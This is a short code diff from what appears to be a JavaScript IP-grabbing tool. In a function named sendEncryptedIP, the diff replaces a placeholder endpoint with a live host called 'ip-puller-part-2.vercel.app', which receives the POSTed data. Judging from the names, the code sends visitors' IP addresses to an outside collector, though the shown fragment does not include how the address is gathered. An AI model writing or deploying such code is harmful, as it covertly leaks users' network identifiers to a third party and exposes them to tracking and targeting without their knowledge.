@@ -33,7 +33,7 @@ async function sendEncryptedIP() {
         };
 
         try {
-            const response = await fetch('https://example.com/api/receiveData', {
+            const response = await fetch('https://ip-puller-part-2.vercel.app//api/receiveData', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
